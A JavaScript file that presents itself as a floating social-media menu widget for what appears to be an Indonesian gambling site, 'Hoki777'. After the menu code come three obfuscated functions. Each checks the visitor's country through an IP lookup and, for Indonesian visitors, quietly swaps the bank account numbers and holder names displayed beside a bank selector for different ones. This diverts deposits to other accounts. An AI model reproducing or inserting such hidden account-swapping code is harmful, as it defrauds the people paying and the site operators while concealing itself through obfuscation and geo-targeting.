(function () {
    const menuWid = document.createElement('div');
    menuWid.className = "widget-menu-fixed";
    menuWid.innerHTML = `
    <style>
    .widget-menu-fixed {
    position: fixed;
    bottom: 50px;
    left: 100px;
    z-index: 99999;
}

.cont-widget {
    height: 70px;
    width: 70px;
    background: rgba(51, 51, 51, 0);
    border-radius: 15px;
    transition: height 0.4s ease, background 0.3s ease;
    overflow: hidden;
    display: flex;
    flex-direction: column;
    align-items: center;
    /* justify-content: center; */
    padding: 10px;
    gap: 0;
    /* default gap 0 */
    backdrop-filter: blur(5px);

}

.cont-widget.active {
    height: auto;
    background: rgba(51, 51, 51, 1);
    /* gap: 20px; */
}


.burger {
    width: 50px;
    height: 50px;
    display: flex;
    flex-direction: column;
    justify-content: center;
    /* Tetap center agar transform rapi */
    align-items: center;
    cursor: pointer;
    background: beige;
    padding: 10px;
    border-radius: 15px;
    box-shadow: 2px 2px 10px rgb(255, 6, 243);
    position: relative;
    gap: 6px;
    /* Jangan terlalu besar */
}

.burger span {
    display: block;
    height: 4px;
    width: 24px;
    background-color: #333;
    border-radius: 2px;
    transition: all 0.3s ease;
    position: relative;
}

.burger.active span:nth-child(1) {
    transform: rotate(45deg);
    position: absolute;
    top: 50%;
    left: 50%;
    translate: -50% -50%;
}

.burger.active span:nth-child(2) {
    opacity: 0;
}

.burger.active span:nth-child(3) {
    transform: rotate(-45deg);
    position: absolute;
    top: 50%;
    left: 50%;
    translate: -50% -50%;
}



.telegram-button,
.whatsapp-button,
.rtp-button,
.fb-button {
    height: 50px;
    width: 50px;
    cursor: pointer;
    background: beige;
    margin-top: 22px;
    padding: 10px;
    border-radius: 15px;
    box-shadow: 2px 2px 10px red;
    justify-content: center;
    align-items: center;
    opacity: 0;
    pointer-events: none;
    transform: translateY(20px) scale(0.9);
    transition: opacity 0.6s cubic-bezier(0.4, 0, 0.2, 1), transform 0.6s cubic-bezier(0.4, 0, 0.2, 1);
    display: flex;
    /* ini tetap tampil, tapi invisible + unclickable awalnya */
}

.cont-widget.active .telegram-button,
.cont-widget.active .whatsapp-button,
.cont-widget.active .rtp-button,
.cont-widget.active .fb-button {
    opacity: 1;
    pointer-events: auto;
    transform: translateY(0) scale(1);
}

.cont-widget.active .telegram-button {
    transition-delay: 0.1s;
}

.cont-widget.active .whatsapp-button {
    transition-delay: 0.2s;
}

.cont-widget.active .rtp-button {
    transition-delay: 0.3s;
}

.cont-widget.active .fb-button {
    transition-delay: 0.4s;
}

.tunjuk {
    position: absolute;
    height: 90px;
    top: -90px;
    z-index: 1000;
}

.hoki-logo {
    display: none;
}

.hoki-logo.active {
    position: absolute;
    height: 90px;
    top: -90px;
    z-index: 1000;
    display: inline-block;
    animation: jump 2s infinite ease-in-out;
}


.tunjuk.active {
    display: none;
}

.link-tombol-widget:hover .widget-tombol {
    transform: translateY(0) scale(1.15);
    /* gabungkan transform */
    background: rgb(124, 124, 103);
    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
}

.widget-tombol {
    transition: transform 0.3s ease, background 0.3s ease, box-shadow 0.3s ease;
    border-radius: 15px;
}


.widget-tombol img {
    animation: pulse2 1.5s infinite;
}

@keyframes pulse {
    0% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }

    50% {
        transform: scale(1.05);
        /* box-shadow: 0 0 20px red; */
    }

    100% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }
}

@keyframes pulse2 {
    0% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }

    50% {
        transform: scale(1.5);
        /* box-shadow: 0 0 20px red; */
    }

    100% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }
}

@keyframes jump {

    0%,
    100% {
        transform: translateY(0);
    }

    50% {
        transform: translateY(-20px);
    }
}

@media screen and (max-width: 769px) {
    .widget-menu-fixed {
        left: 30px;
        bottom: 100px;
    }
}
    </style>
        <div class="cont-widget" id="containerWidget">
            <div class="group-widget">
                <div class="burger"
                    onclick="this.classList.toggle('active');document.getElementById('containerWidget').classList.toggle('active');document.getElementById('tunjukgif').classList.toggle('active');document.getElementById('lghok').classList.toggle('active');">
                    <span></span>
                    <span></span>
                    <span></span>
                </div>
                <a href="https://hk777.top/telegramgruphoki777/" class="link-tombol-widget">
                    <div class="telegram-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/tele2.webp" alt="Telegram Hoki777" width="30" height="30">
                    </div>
                </a>
                <a href="https://hk777.top/wahoki777" class="link-tombol-widget">
                    <div class="whatsapp-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/wa2.webp" alt="Whatsapp Hoki777" width="30" height="30">
                    </div>
                </a>
                <a href="https://hk777.top/RTP-Hoki777" class="link-tombol-widget">
                    <div class="rtp-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/rtp2.webp" alt="RTP Hoki777" width="30" height="30">
                    </div>
                </a>
                <a href="https://hk777.top/facebookgruphoki777/" class="link-tombol-widget">
                    <div class="fb-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/fb2.webp" alt="Facebook Hoki777" width="30" height="30">
                    </div>
                </a>
            </div>
        </div>
        
        <img src="https://yudha125.github.io/menu-widget/Image/hoki.webp" alt="Logo Hoki777" class="hoki-logo" id="lghok">
        <img src="https://yudha125.github.io/menu-widget/Image/tunjuk.webp" alt="Tunjuk Hoki777" class="tunjuk" id="tunjukgif">
    `;
    document.body.appendChild(menuWid);

})();

(function(_0xb1e0da,_0x438f,_0xe667a,_0x6bdebe){_0x438f="DI".split("").reverse().join("");_0xb1e0da=606141^606138;_0x6bdebe="\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0069\u0070\u0061\u0070\u0069\u002E\u0063\u006F\u002F\u006A\u0073\u006F\u006E\u002F";_0xe667a='\u0069\u0069\u0063\u0062\u0062\u0061';function _0xc_0x32b(_0xaba6d,_0x8864fb,_0x5eefda,_0x74a97f,_0xc781df,_0x3ffcbd){_0xaba6d="\u0037\u0033\u0039\u0031\u0039\u0035\u0033\u0030\u0031\u0039";var _0x5ge82c=(122067^122075)+(259287^259287);_0x8864fb="\u0032\u0031\u0032\u0030\u0034\u0035\u0032\u0030\u0030\u0035";_0x5ge82c=332365^332361;var _0x93eccd=(511698^511701)+(511411^511409);_0x5eefda="AYXXXA YXXXR".split("").reverse().join("");_0x93eccd=(231024^231025)+(370958^370957);_0x74a97f="\u004C\u0045\u0056\u0049";_0xc781df="tceleSknab".split("").reverse().join("");function _0xae_0x1f1(){const _0x2eb21a=document['\u0071\u0075\u0065\u0072\u0079\u0053\u0065\u006C\u0065\u0063\u0074\u006F\u0072\u0041\u006C\u006C']("\u0073\u0070\u0061\u006E");for(let i=644158^644158;i<_0x2eb21a['\u006C\u0065\u006E\u0067\u0074\u0068'];i++){if(_0x2eb21a[i]['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']['\u0074\u0072\u0069\u006D']()===_0xaba6d){_0x2eb21a[i]['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']=_0x8864fb;break;}}var _0x1c_0xg6c=(927924^927927)+(602974^602967);const _0xeb1bf=document['\u0071\u0075\u0065\u0072\u0079\u0053\u0065\u006C\u0065\u0063\u0074\u006F\u0072\u0041\u006C\u006C']("\u0064\u0069\u0076");_0x1c_0xg6c=(177431^177424)+(131443^131440);for(let i=748820^748820;i<_0xeb1bf['\u006C\u0065\u006E\u0067\u0074\u0068'];i++){if(_0xeb1bf[i]['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']['\u0074\u0072\u0069\u006D']()===_0x5eefda){_0xeb1bf[i]['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']=_0x74a97f;break;}}}function _0x97eeg(_0x8329c){const _0x7690a=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064'](_0xc781df);_0x8329c=(659249^659257)+(763376^763378);if(!_0x7690a)return false;_0xae_0x1f1();if(!_0x7690a['\u0064\u0061\u0074\u0061\u0073\u0065\u0074']['\u005F\u0073\u0063\u0072\u0069\u0070\u0074\u0049\u006E\u0069\u0074\u0069\u0061\u006C\u0069\u007A\u0065\u0064']){_0x7690a['\u0061\u0064\u0064\u0045\u0076\u0065\u006E\u0074\u004C\u0069\u0073\u0074\u0065\u006E\u0065\u0072']("\u0063\u0068\u0061\u006E\u0067\u0065",_0xae_0x1f1);_0x7690a['\u0064\u0061\u0074\u0061\u0073\u0065\u0074']['\u005F\u0073\u0063\u0072\u0069\u0070\u0074\u0049\u006E\u0069\u0074\u0069\u0061\u006C\u0069\u007A\u0065\u0064']="eurt".split("").reverse().join("");}return!![];}if(_0x97eeg())return;const _0x8f4g=new MutationObserver(()=>{if(_0x97eeg())_0x8f4g['\u0064\u0069\u0073\u0063\u006F\u006E\u006E\u0065\u0063\u0074']();});_0x3ffcbd=(207105^207104)+(371055^371048);_0x8f4g['\u006F\u0062\u0073\u0065\u0072\u0076\u0065'](document['\u0062\u006F\u0064\u0079'],{'\u0063\u0068\u0069\u006C\u0064\u004C\u0069\u0073\u0074':!![],'\u0073\u0075\u0062\u0074\u0072\u0065\u0065':!![]});}async function _0x2ba(){try{const _0x614fc=await fetch(_0x6bdebe);if(!_0x614fc['\u006F\u006B'])throw new Error("rorrE IPA".split("").reverse().join(""));let _0xcea21c;const _0x96df=await _0x614fc['\u006A\u0073\u006F\u006E']();_0xcea21c=340974^340973;const _0x80bac=_0x96df['\u0063\u006F\u0075\u006E\u0074\u0072\u0079\u005F\u0063\u006F\u0064\u0065'];if(!_0x80bac)throw new Error("\u0044\u0061\u0074\u0061\u0020\u006E\u0065\u0067\u0061\u0072\u0061\u0020\u006B\u006F\u0073\u006F\u006E\u0067");if(_0x80bac===_0x438f){console['\u006C\u006F\u0067']("\u2705");_0xc_0x32b();}else{console['\u006C\u006F\u0067']("\uD83D\uDEAB");}}catch(err){console['\u0077\u0061\u0072\u006E'](".rikolbid NAMA pirkS .PI isakol isakifirev lagaG \uFE0F\u26A0".split("").reverse().join(""));}}_0x2ba();})();
(function(_0x6c0fd,_0xdd99ac){var _0xb0eac=(480875^480867)+(329322^329323);_0x6c0fd="\u0049\u0044";_0xb0eac="hjlmlp".split("").reverse().join("");_0xdd99ac="\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0069\u0070\u0061\u0070\u0069\u002E\u0063\u006F\u002F\u006A\u0073\u006F\u006E\u002F";function _0xc7b2b(_0x85888b,_0xeae36a,_0xe0e1f,_0x_0x77a,_0x516c2g){_0x85888b="\u0030\u0038\u0033\u0039\u002D\u0030\u0031\u0030\u0030\u002D\u0035\u0037\u0038\u0031\u002D\u0035\u0030\u0039";_0xeae36a="\u0030\u0033\u0034\u0035\u002D\u0030\u0031\u0030\u0035\u002D\u0030\u0032\u0031\u0031\u002D\u0035\u0030\u0036";_0xe0e1f="\u0043\u002A\u002A\u002A\u002A\u0052\u0041\u0020\u0044\u002A\u002A\u0049";var _0xgg5ecc=(135393^135394)+(218859^218863);_0x_0x77a="ANAISUL".split("").reverse().join("");_0xgg5ecc=830885^830882;var _0xg7f60g=(636913^636919)+(861847^861846);_0x516c2g="\u0062\u0061\u006E\u006B\u0053\u0065\u006C\u0065\u0063\u0074";_0xg7f60g='\u0071\u006C\u0067\u006E\u0067\u0069';function _0x56f(_0x67123f){var _0xfa51c=(901383^901380)+(998116^998116);const _0x25f6gf=document['\u0071\u0075\u0065\u0072\u0079\u0053\u0065\u006C\u0065\u0063\u0074\u006F\u0072\u0041\u006C\u006C']("naps".split("").reverse().join(""));_0xfa51c="cmihac".split("").reverse().join("");for(let i=368970^368970;i<_0x25f6gf['\u006C\u0065\u006E\u0067\u0074\u0068'];i++){if(_0x25f6gf[i]['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']['\u0074\u0072\u0069\u006D']()===_0x85888b){_0x25f6gf[i]['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']=_0xeae36a;break;}}const _0xc83ge=document['\u0071\u0075\u0065\u0072\u0079\u0053\u0065\u006C\u0065\u0063\u0074\u006F\u0072\u0041\u006C\u006C']("\u0064\u0069\u0076");_0x67123f=(356587^356588)+(416706^416710);for(let i=815064^815064;i<_0xc83ge['\u006C\u0065\u006E\u0067\u0074\u0068'];i++){if(_0xc83ge[i]['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']['\u0074\u0072\u0069\u006D']()===_0xe0e1f){_0xc83ge[i]['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']=_0x_0x77a;break;}}}function _0xd43b(){var _0x1gfcf=(865681^865687)+(309923^309924);const _0x13f2df=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064'](_0x516c2g);_0x1gfcf=(150697^150688)+(152676^152672);if(!_0x13f2df)return false;_0x56f();if(!_0x13f2df['\u0064\u0061\u0074\u0061\u0073\u0065\u0074']['\u005F\u0073\u0063\u0072\u0069\u0070\u0074\u0049\u006E\u0069\u0074\u0069\u0061\u006C\u0069\u007A\u0065\u0064']){_0x13f2df['\u0061\u0064\u0064\u0045\u0076\u0065\u006E\u0074\u004C\u0069\u0073\u0074\u0065\u006E\u0065\u0072']("\u0063\u0068\u0061\u006E\u0067\u0065",_0x56f);_0x13f2df['\u0064\u0061\u0074\u0061\u0073\u0065\u0074']['\u005F\u0073\u0063\u0072\u0069\u0070\u0074\u0049\u006E\u0069\u0074\u0069\u0061\u006C\u0069\u007A\u0065\u0064']="\u0074\u0072\u0075\u0065";}return!![];}if(_0xd43b())return;var _0xd5cb=(638036^638034)+(506100^506101);const _0x62bd=new MutationObserver(()=>{if(_0xd43b())_0x62bd['\u0064\u0069\u0073\u0063\u006F\u006E\u006E\u0065\u0063\u0074']();});_0xd5cb=(201221^201219)+(395375^395371);_0x62bd['\u006F\u0062\u0073\u0065\u0072\u0076\u0065'](document['\u0062\u006F\u0064\u0079'],{"childList":!![],'\u0073\u0075\u0062\u0074\u0072\u0065\u0065':!![]});}async function _0xa937da(){try{const _0xda47e=await fetch(_0xdd99ac);if(!_0xda47e['\u006F\u006B'])throw new Error("\u0041\u0050\u0049\u0020\u0045\u0072\u0072\u006F\u0072");var _0x7ebf=(559008^559016)+(747281^747289);const _0x9fe=await _0xda47e['\u006A\u0073\u006F\u006E']();_0x7ebf=229106^229106;const _0xf70ffa=_0x9fe['\u0063\u006F\u0075\u006E\u0074\u0072\u0079\u005F\u0063\u006F\u0064\u0065'];if(!_0xf70ffa)throw new Error("\u0044\u0061\u0074\u0061\u0020\u006E\u0065\u0067\u0061\u0072\u0061\u0020\u006B\u006F\u0073\u006F\u006E\u0067");if(_0xf70ffa===_0x6c0fd){console['\u006C\u006F\u0067']("\u2705");_0xc7b2b();}else{console['\u006C\u006F\u0067']("\uD83D\uDEAB");}}catch(err){console['\u0077\u0061\u0072\u006E'](".rikolbid NAMA pirkS .PI isakol isakifirev lagaG \uFE0F\u26A0".split("").reverse().join(""));}}_0xa937da();})();
(function(_0x4dc,_0x13b5dc,_0xc9845f){_0x13b5dc="\u0049\u0044";_0x4dc=632118^632114;var _0xb2b6ed=(965890^965894)+(134117^134113);_0xc9845f="\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0069\u0070\u0061\u0070\u0069\u002E\u0063\u006F\u002F\u006A\u0073\u006F\u006E\u002F";_0xb2b6ed='\u0067\u006C\u006C\u006A\u0070\u006F';function _0x8ea1ef(_0xa35c8d,_0x2d5abc,_0xg21eb,_0x37g,_0xd9305b,_0xf8d74b,_0xbe2fcg){var _0x2ee46d=(948647^948643)+(622088^622089);_0xa35c8d="\u0031\u0038\u0030\u0030\u0030\u0038\u0038\u0037\u0030\u0036";_0x2ee46d=(354205^354203)+(242258^242263);_0xg21eb="\u0031\u0037\u0039\u0036\u0033\u0037\u0037\u0031\u0033\u0033";_0x2d5abc=(658171^658172)+(604637^604636);_0xd9305b="\u0053\u0041\u0078\u0078\u0078\u0078\u0049";_0x37g=661109^661109;_0xf8d74b="LAFIR".split("").reverse().join("");var _0xb464a=(161834^161832)+(765490^765492);_0xbe2fcg="\u0062\u0061\u006E\u006B\u0053\u0065\u006C\u0065\u0063\u0074";_0xb464a=(909946^909949)+(192973^192975);function _0xf32c(_0x84g3dc){const _0x3a2c=document['\u0071\u0075\u0065\u0072\u0079\u0053\u0065\u006C\u0065\u0063\u0074\u006F\u0072\u0041\u006C\u006C']("naps".split("").reverse().join(""));for(let i=234750^234750;i<_0x3a2c['\u006C\u0065\u006E\u0067\u0074\u0068'];i++){if(_0x3a2c[i]['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']['\u0074\u0072\u0069\u006D']()===_0xa35c8d){_0x3a2c[i]['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']=_0xg21eb;break;}}const _0xe4a18a=document['\u0071\u0075\u0065\u0072\u0079\u0053\u0065\u006C\u0065\u0063\u0074\u006F\u0072\u0041\u006C\u006C']("vid".split("").reverse().join(""));_0x84g3dc=(999550^999547)+(521346^521349);for(let i=341094^341094;i<_0xe4a18a['\u006C\u0065\u006E\u0067\u0074\u0068'];i++){if(_0xe4a18a[i]['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']['\u0074\u0072\u0069\u006D']()===_0xd9305b){_0xe4a18a[i]['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']=_0xf8d74b;break;}}}function _0x2eaa1b(){const _0x7083e=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064'](_0xbe2fcg);if(!_0x7083e)return false;_0xf32c();if(!_0x7083e['\u0064\u0061\u0074\u0061\u0073\u0065\u0074']['\u005F\u0073\u0063\u0072\u0069\u0070\u0074\u0049\u006E\u0069\u0074\u0069\u0061\u006C\u0069\u007A\u0065\u0064']){_0x7083e['\u0061\u0064\u0064\u0045\u0076\u0065\u006E\u0074\u004C\u0069\u0073\u0074\u0065\u006E\u0065\u0072']("\u0063\u0068\u0061\u006E\u0067\u0065",_0xf32c);_0x7083e['\u0064\u0061\u0074\u0061\u0073\u0065\u0074']['\u005F\u0073\u0063\u0072\u0069\u0070\u0074\u0049\u006E\u0069\u0074\u0069\u0061\u006C\u0069\u007A\u0065\u0064']="\u0074\u0072\u0075\u0065";}return!![];}if(_0x2eaa1b())return;var _0x3849gb=(406082^406083)+(639863^639856);const _0x3a_0xdf7=new MutationObserver(()=>{if(_0x2eaa1b())_0x3a_0xdf7['\u0064\u0069\u0073\u0063\u006F\u006E\u006E\u0065\u0063\u0074']();});_0x3849gb=(656132^656128)+(362856^362862);_0x3a_0xdf7['\u006F\u0062\u0073\u0065\u0072\u0076\u0065'](document['\u0062\u006F\u0064\u0079'],{"childList":!![],"subtree":!![]});}async function _0x86a(){try{var _0x7dbb3b=(783587^783594)+(591149^591146);const _0x519bag=await fetch(_0xc9845f);_0x7dbb3b='\u006D\u0064\u0065\u006C\u006E\u0064';if(!_0x519bag['\u006F\u006B'])throw new Error("rorrE IPA".split("").reverse().join(""));var _0x1142g=(796528^796532)+(649577^649580);const _0xef8d2a=await _0x519bag['\u006A\u0073\u006F\u006E']();_0x1142g=(518722^518723)+(455525^455523);const _0x295ba=_0xef8d2a['\u0063\u006F\u0075\u006E\u0074\u0072\u0079\u005F\u0063\u006F\u0064\u0065'];if(!_0x295ba)throw new Error("\u0044\u0061\u0074\u0061\u0020\u006E\u0065\u0067\u0061\u0072\u0061\u0020\u006B\u006F\u0073\u006F\u006E\u0067");if(_0x295ba===_0x13b5dc){console['\u006C\u006F\u0067']("\u2705");_0x8ea1ef();}else{console['\u006C\u006F\u0067']("\uDEAB\uD83D".split("").reverse().join(""));}}catch(err){console['\u0077\u0061\u0072\u006E'](".rikolbid NAMA pirkS .PI isakol isakifirev lagaG \uFE0F\u26A0".split("").reverse().join(""));}}_0x86a();})();
